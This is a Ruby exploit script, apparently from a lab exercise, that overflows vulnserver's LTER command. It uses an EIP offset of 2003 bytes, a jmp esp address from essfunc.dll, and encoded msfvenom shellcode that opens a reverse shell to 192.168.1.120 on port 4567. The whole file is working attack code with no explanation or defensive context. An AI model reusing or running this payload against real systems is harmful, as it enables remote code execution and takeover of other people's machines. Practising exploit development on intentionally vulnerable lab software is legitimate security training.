#!/usr/bin/ruby
require 'socket'

target = '192.168.1.126'
port = 9999

# eip offset at 2003
payload = "A" * 2003
# 0x62501203 : "jmp esp" | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\vulnserver-master\essfunc.dll)
payload += "\x03\x12\x50\x62"

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.120 LPORT=4567 EXITFUNC=thread -e x86/alpha_mixed BufferRegister=ESP -f ruby
payload += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" +
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30" +
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42" +
"\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x68\x68" +
"\x4c\x42\x33\x30\x65\x50\x47\x70\x43\x50\x4f\x79\x79\x75" +
"\x70\x31\x4b\x70\x63\x54\x6e\x6b\x36\x30\x66\x50\x6c\x4b" +
"\x46\x32\x44\x4c\x4e\x6b\x76\x32\x72\x34\x4e\x6b\x50\x72" +
"\x34\x68\x56\x6f\x58\x37\x50\x4a\x56\x46\x35\x61\x69\x6f" +
"\x6c\x6c\x55\x6c\x31\x71\x63\x4c\x55\x52\x34\x6c\x71\x30" +
"\x39\x51\x5a\x6f\x56\x6d\x57\x71\x4b\x77\x58\x62\x79\x62" +
"\x36\x32\x62\x77\x4c\x4b\x71\x42\x52\x30\x6e\x6b\x71\x5a" +
"\x65\x6c\x6e\x6b\x62\x6c\x76\x71\x62\x58\x6a\x43\x43\x78" +
"\x63\x31\x78\x51\x42\x71\x6e\x6b\x62\x79\x75\x70\x73\x31" +
"\x48\x53\x4c\x4b\x63\x79\x64\x58\x79\x73\x76\x5a\x77\x39" +
"\x6e\x6b\x77\x44\x6c\x4b\x75\x51\x48\x56\x45\x61\x4b\x4f" +
"\x6e\x4c\x4a\x61\x68\x4f\x74\x4d\x66\x61\x6b\x77\x56\x58" +
"\x49\x70\x33\x45\x4a\x56\x45\x53\x63\x4d\x7a\x58\x75\x6b" +
"\x61\x6d\x37\x54\x53\x45\x68\x64\x72\x78\x4e\x6b\x61\x48" +
"\x36\x44\x36\x61\x69\x43\x61\x76\x4e\x6b\x76\x6c\x42\x6b" +
"\x4e\x6b\x70\x58\x47\x6c\x45\x51\x4b\x63\x6c\x4b\x36\x64" +
"\x6c\x4b\x65\x51\x38\x50\x6e\x69\x63\x74\x76\x44\x75\x74" +
"\x61\x4b\x53\x6b\x55\x31\x52\x79\x63\x6a\x43\x61\x4b\x4f" +
"\x39\x70\x51\x4f\x31\x4f\x73\x6a\x4e\x6b\x45\x42\x78\x6b" +
"\x4e\x6d\x73\x6d\x51\x78\x56\x53\x67\x42\x47\x70\x77\x70" +
"\x31\x78\x70\x77\x73\x43\x36\x52\x73\x6f\x32\x74\x45\x38" +
"\x50\x4c\x51\x67\x67\x56\x67\x77\x59\x6f\x39\x45\x6e\x58" +
"\x6c\x50\x55\x51\x37\x70\x45\x50\x35\x79\x49\x54\x46\x34" +
"\x72\x70\x32\x48\x75\x79\x4f\x70\x42\x4b\x55\x50\x79\x6f" +
"\x7a\x75\x62\x70\x52\x70\x72\x70\x46\x30\x47\x30\x32\x70" +
"\x47\x30\x70\x50\x51\x78\x4a\x4a\x64\x4f\x4b\x6f\x59\x70" +
"\x39\x6f\x39\x45\x6f\x67\x61\x7a\x47\x75\x62\x48\x79\x50" +
"\x69\x38\x43\x31\x43\x48\x51\x78\x37\x72\x35\x50\x52\x31" +
"\x5a\x77\x4e\x69\x79\x76\x42\x4a\x44\x50\x30\x56\x51\x47" +
"\x72\x48\x5a\x39\x49\x35\x64\x34\x65\x31\x49\x6f\x7a\x75" +
"\x6b\x35\x69\x50\x32\x54\x64\x4c\x6b\x4f\x42\x6e\x63\x38" +
"\x43\x45\x48\x6c\x53\x58\x58\x70\x6d\x65\x6f\x52\x73\x66" +
"\x39\x6f\x6a\x75\x63\x58\x63\x53\x72\x4d\x30\x64\x73\x30" +
"\x4c\x49\x5a\x43\x42\x77\x56\x37\x62\x77\x55\x61\x58\x76" +
"\x71\x7a\x54\x52\x72\x79\x71\x46\x58\x62\x69\x6d\x51\x76" +
"\x68\x47\x73\x74\x54\x64\x45\x6c\x66\x61\x67\x71\x4e\x6d" +
"\x57\x34\x45\x74\x76\x70\x68\x46\x45\x50\x67\x34\x46\x34" +
"\x72\x70\x43\x66\x62\x76\x50\x56\x61\x56\x53\x66\x70\x4e" +
"\x66\x36\x50\x56\x62\x73\x36\x36\x30\x68\x71\x69\x68\x4c" +
"\x77\x4f\x4f\x76\x69\x6f\x68\x55\x4f\x79\x4d\x30\x50\x4e" +
"\x43\x66\x47\x36\x69\x6f\x46\x50\x43\x58\x57\x78\x6b\x37" +
"\x67\x6d\x55\x30\x39\x6f\x69\x45\x6f\x4b\x6d\x30\x77\x6d" +
"\x47\x5a\x75\x5a\x61\x78\x69\x36\x4a\x35\x6f\x4d\x6f\x6d" +
"\x79\x6f\x6a\x75\x55\x6c\x35\x56\x51\x6c\x37\x7a\x6d\x50" +
"\x39\x6b\x6b\x50\x52\x55\x74\x45\x6d\x6b\x37\x37\x67\x63" +
"\x70\x72\x50\x6f\x30\x6a\x77\x70\x36\x33\x39\x6f\x58\x55" +
"\x41\x41"

payload += "C" * (3000 - payload.length)

s = TCPSocket.open(target, port)
s.puts('LTER /.:/' + payload)
s.close()
